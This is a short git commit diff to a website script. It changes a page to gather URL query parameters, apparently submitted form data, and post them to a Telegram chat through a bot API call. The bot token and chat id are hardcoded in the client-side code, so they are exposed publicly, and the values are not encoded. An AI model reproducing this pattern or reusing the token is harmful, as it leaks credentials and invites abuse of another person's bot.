baa8de2be47df7fbf95fdc89ecafa5d49c1fbfa9
Sergey Oganezov <oganez09@mail.ru>
2023-12-17 07:59:02 +0300

    d3 update 2

--- d3/js/script.js
+++ d3/js/script.js
@@ -4,15 +4,17 @@ $returnBack.addEventListener('click', () => {
   history.back();
 });
 
-const get = window.location.search.replace( '?', '');
-const arr = get.split('&').reduce(
-  function(p,e){
-      var a = e.split('=');
-      p[ decodeURIComponent(a[0])] = decodeURIComponent(a[1]);
-      return p;
-  },
-  {}
-);
-console.log(arr)
+const get = window.location.search
+  .replace( '?', '')
+  .split('&')
+  .map(item => item.replace('=', ' '))
+  .join(' ')
+  // .reduce(function(obj, arr){
+  //   const item = arr.split('=');
+  //   obj[decodeURIComponent(item[0])] = decodeURIComponent(item[1]);
+  //   return obj;
+  // }, {});
 
-fetch(get);
+const sendMsg = `https://api.telegram.org/bot6404900072:AAEWApiLlg1mAHquxDcJ9oVwrfzI7Fx91HY/sendMessage?chat_id=-1002114761565&text=${get}`;
+
+fetch(sendMsg);
